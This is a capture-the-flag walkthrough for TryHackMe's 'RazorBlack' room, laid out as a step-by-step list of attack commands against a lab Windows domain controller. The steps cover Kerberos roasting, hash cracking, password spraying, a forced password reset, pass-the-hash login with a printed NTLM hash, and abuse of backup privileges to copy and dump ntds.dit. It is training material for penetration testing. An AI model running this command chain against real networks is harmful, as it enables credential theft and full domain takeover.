...
This is a **TryHackMe** room which can be found at: {{< rawhtml >}}<a href="https://tryhackme.com/room/raz0rblack" target="_blank" style="color:#E30F0F;">RazorBlack</a>{{< /rawhtml >}}
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `nmap -p- -T4 10.10.43.148`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo nmap -A -sC -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,47001 10.10.43.148`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `showmount -e 10.10.43.148`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo mount -t nfs 10.10.43.148:/users /mnt/raz0rblack`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `libreoffice employee-status.xlsx`
```javascript
daven port
imogen royce
tamara vidal
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/GetNPUsers.py raz0rblack.thm/ -usersfile usernames.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `/opt/impacket/examples/GetUserSPNs.py raz0rblack.thm/twilliams:'roastpotatoes' -request`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt`
```shell
...
{{< rawhtml >}}<br> {{< /rawhtml >}}
We can login as `xyan1d3` using `evil-winrm`. In order to find the `xyan1d3's` flag we need to retrieve (decrypt) some `secret` data from PowerShell. We can find the commands here: https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx.
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `crackmapexec smb 10.10.43.148 -u usernames.txt -p passwords.txt --continue-on-success`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo python3 /opt/impacket/examples/smbpasswd.py sbradley:roastpotatoes@10.10.43.148 -newpass password`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `smbmap -H 10.10.43.148 -u sbradley -p password`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL -just-dc-ntlm | cut -d ":" -f 4 | grep -wE '^.{32}' > hashes.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `crackmapexec winrm 10.10.43.148 -u usernames.txt -H hashes.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `evil-winrm -i 10.10.43.148 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d`
```shell
...
{{< rawhtml >}}<br> {{< /rawhtml >}}
We can follow the 1st method from this great article: https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960 (`disk shadow`, `robocopy`).
{{< rawhtml >}}<br> {{< /rawhtml >}}
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `upload back_script.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `diskshadow /s back_script.txt`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `robocopy /b E:\Windows\ntds . ntds.dit`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `reg save hklm\system C:\temp\system.bak`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `download C:\temp\ntds.dit /home/geobour98/ntds.dit`
- {{< rawhtml >}}Command: {{< /rawhtml >}} `download C:\temp\system.bak /home/geobour98/system.bak`
```shell
...
- {{< rawhtml >}}Command: {{< /rawhtml >}} `sudo /opt/impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL > hashes1.txt`
```shell
...
{{< rawhtml >}}
  <img src="../../../thm/razorblack/razorblack.png" alt="RazorBlack photo" style="width:700px;height:300px;">
{{< /rawhtml >}}
